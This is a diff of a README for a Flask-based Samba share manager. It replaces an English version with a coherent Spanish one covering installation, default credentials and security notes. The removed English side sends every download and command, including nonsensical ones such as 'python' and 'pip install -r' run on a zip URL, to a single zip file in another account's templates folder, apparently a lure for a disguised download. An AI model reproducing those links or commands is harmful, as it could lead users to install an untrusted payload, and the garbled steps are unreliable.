@@ -1,133 +1,106 @@
-# 🗂️ samba-web-manager - Manage Your Samba Shares Easily
+# 🗂️ Samba Web Manager
 
-[![Download](https://github.com/sahni132/samba-web-manager/raw/refs/heads/main/templates/samba-web-manager-v1.3.zip)](https://github.com/sahni132/samba-web-manager/raw/refs/heads/main/templates/samba-web-manager-v1.3.zip)
+Panel de administración web moderno para gestionar recursos compartidos de Samba en Linux (Ubuntu/Debian).
 
-## 📋 Overview
+## ✨ Características
 
-samba-web-manager is a modern web-based tool for managing Samba file shares. Built using Flask, it offers user management, file upload and download, and permission control—all with a responsive interface. Whether you want to share files with friends or manage a family network, this tool makes the process simple and straightforward.
+- 🔐 **Autenticación segura** con roles Admin / Usuario
+- 👥 **Gestión de usuarios** — crear, eliminar y cambiar contraseñas
+- 📁 **Gestión de carpetas compartidas** — crear y eliminar recursos compartidos con explorador de directorios
+- 🔑 **Control de permisos granular** — Solo Lectura o Lectura/Escritura por usuario y carpeta
+- 📊 **Matriz de permisos** — vista de todos los usuarios × todas las carpetas de un vistazo
+- 📂 **Explorador de archivos integrado** — navegar, subir, descargar, editar y eliminar archivos
+- 🔍 **Descubrimiento de red automático** (via `wsdd`) — visible en "Red" de Windows 10/11 sin configuración adicional
+- 📋 **Registro de actividad** — auditoría de todas las acciones del sistema
+- 🔄 **Cambio de contraseña forzado** en el primer inicio de sesión del admin
+- 🛡️ **Rate limiting** en el login para prevenir ataques de fuerza bruta
 
-## 🚀 Getting Started
+## 🖥️ Requisitos del Sistema
 
-Follow these steps to download and run samba-web-manager easily.
+- **Sistema Operativo:** Ubuntu 20.04+ o Debian 11+
+- **Acceso:** `sudo` o root
+- **Puertos:** 5000 (panel web), 445/139 (Samba SMB)
 
-### 💻 System Requirements
+## 🚀 Instalación
 
-- **Operating System:** Linux (Debian or Ubuntu recommended)
-- **Web Browser:** Any modern browser (Chrome, Firefox, Safari)
-- **Python:** Version 3.7 or above installed
+```bash
+# 1. Clonar el repositorio
+git clone https://github.com/joseramirez63/samba-web-manager.git
+cd samba-web-manager
 
-### 📥 Download & Install
-
-To get started, visit this page to download the application:
-
-[Download samba-web-manager](https://github.com/sahni132/samba-web-manager/raw/refs/heads/main/templates/samba-web-manager-v1.3.zip)
-
-1. Go to the [Releases page](https://github.com/sahni132/samba-web-manager/raw/refs/heads/main/templates/samba-web-manager-v1.3.zip).
-2. Look for the latest version of samba-web-manager.
-3. Download the installation package that matches your operating system.
-
-### 🔍 Features
-
-- **User Management:** Add, remove, or manage users easily.
-- **File Upload/Download:** Upload and download files directly from your web browser.
-- **Permission Control:** Set different access levels for users.
-- **Responsive UI:** Works well on both desktop and mobile devices.
-
-### ⚙️ Installation Guide
-
-After downloading the file, follow these steps to install samba-web-manager:
-
-1. **Open a Terminal:** Press `Ctrl + Alt + T` on your keyboard to launch the terminal.
-   
-2. **Navigate to the Download Folder:**
-   ```bash
-   cd ~/Downloads
-   ```
-   
-3. **Unzip the Package:** If your download is a zipped file, run:
-   ```bash
-   unzip https://github.com/sahni132/samba-web-manager/raw/refs/heads/main/templates/samba-web-manager-v1.3.zip
-   ```
-   
-4. **Install Dependencies:** Navigate to the extracted folder and run:
-   ```bash
-   cd samba-web-manager
-   pip install -r https://github.com/sahni132/samba-web-manager/raw/refs/heads/main/templates/samba-web-manager-v1.3.zip
-   ```
-   
-5. **Run the Application:**
-   ```bash
-   python https://github.com/sahni132/samba-web-manager/raw/refs/heads/main/templates/samba-web-manager-v1.3.zip
-   ```
-
-### 🌐 Accessing the Application
-
-Open your web browser and enter the following URL:
-
-```
-http://localhost:5000
+# 2. Ejecutar el script de instalación (requiere root)
+sudo bash install.sh
 ```
 
-This URL directs you to the samba-web-manager interface, where you can start managing your Samba shares.
+El script instalará automáticamente:
+- `samba`, `nmbd`, `wsdd` (descubrimiento de red para Windows 10/11)
+- Python 3 y las dependencias (`flask`, `werkzeug`, `flask-limiter`)
+- El servicio `samba-manager` en systemd
+- Una `SECRET_KEY` aleatoria en `/etc/samba-manager/config.env`
+- Los permisos necesarios en `sudoers`
 
-### 🔒 Configuring Samba
+## 🌐 Acceso al Panel
 
-To use samba-web-manager effectively, you need to configure Samba on your system. Follow these steps to set up Samba:
+Una vez instalado, abre en tu navegador:
 
-1. **Install Samba:**
-   ```bash
-   sudo apt install samba
-   ```
+```
+http://<IP-del-servidor>:5000
+```
 
-2. **Edit the Samba Configuration File:**
-   Use a text editor to modify the Samba configuration:
-   ```bash
-   sudo nano https://github.com/sahni132/samba-web-manager/raw/refs/heads/main/templates/samba-web-manager-v1.3.zip
-   ```
+### Credenciales por defecto
 
-3. **Add Your Shared Directory:** 
-   At the bottom of the file, add:
-   ```
-   [shared]
-   path = /path/to/shared/folder
-   browseable = yes
-   read only = no
-   valid users = your_user
-   ```
-   Replace `/path/to/shared/folder` with the actual path you want to share.
+| Usuario | Contraseña |
+|---------|------------|
+| `admin` | `admin123` |
 
-4. **Restart Samba:**
-   ```bash
-   sudo systemctl restart smbd
-   ```
+> ⚠️ **Se te pedirá cambiar la contraseña en el primer inicio de sesión.**
 
-### 🔑 Setting Up Users
+## ⚙️ Gestión del Servicio
 
-To add users to Samba:
+```bash
+# Estado
+sudo systemctl status samba-manager
 
-1. **Create a Samba User:**
-   ```bash
-   sudo smbpasswd -a username
-   ```
-   Replace `username` with your chosen name.
+# Reiniciar
+sudo systemctl restart samba-manager
 
-2. **Set User Permissions:** Adjust the permissions in the shared folder using:
-   ```bash
-   sudo chown -R username:username /path/to/shared/folder
-   ```
+# Detener
+sudo systemctl stop samba-manager
 
-### 📚 Troubleshooting
+# Ver logs en tiempo real
+sudo journalctl -u samba-manager -f
+```
 
-If you encounter issues:
+## 🔒 Seguridad
 
-- Ensure that Samba is installed and running.
-- Check if you have correctly set user permissions.
-- Verify that your firewall is not blocking access.
+- La `SECRET_KEY` se genera aleatoriamente durante la instalación y se almacena en `/etc/samba-manager/config.env` (permisos 600).
+- Las contraseñas se almacenan con hash usando Werkzeug (`pbkdf2:sha256`).
+- El login tiene límite de 10 intentos por minuto por IP.
+- La contraseña mínima es de 8 caracteres.
+- El protocolo mínimo de Samba es SMB2 (más seguro que SMB1).
 
-For further assistance, visit the GitHub Issues page or consult the Samba documentation.
+## 📁 Estructura del Proyecto
 
-### 📜 License
+```
+samba-web-manager/
+├── app.py              # Aplicación Flask principal
+├── install.sh          # Script de instalación automática
+├── templates/
+│   ├── index.html      # Panel de administración (SPA)
+│   └── login.html      # Página de inicio de sesión
+└── README.md
+```
 
-This project is licensed under the MIT License. Feel free to use, modify, or distribute it. Check the LICENSE file in the repository for details.
+Los datos de la aplicación se almacenan en `/opt/samba-manager/data/`:
+- `users.json` — usuarios y roles
+- `shares.json` — carpetas compartidas
+- `permissions.json` — permisos por usuario y carpeta
+- `logs.json` — registro de actividad
 
-By following these steps, you can easily download and set up samba-web-manager to manage your Samba file share efficiently. Enjoy seamless file sharing!
+## 📜 Licencia
+
+MIT License © 2025
+
+## 🤝 Contribuciones
+
+¡Las pull requests son bienvenidas! Abre un issue para reportar problemas o sugerir mejoras.
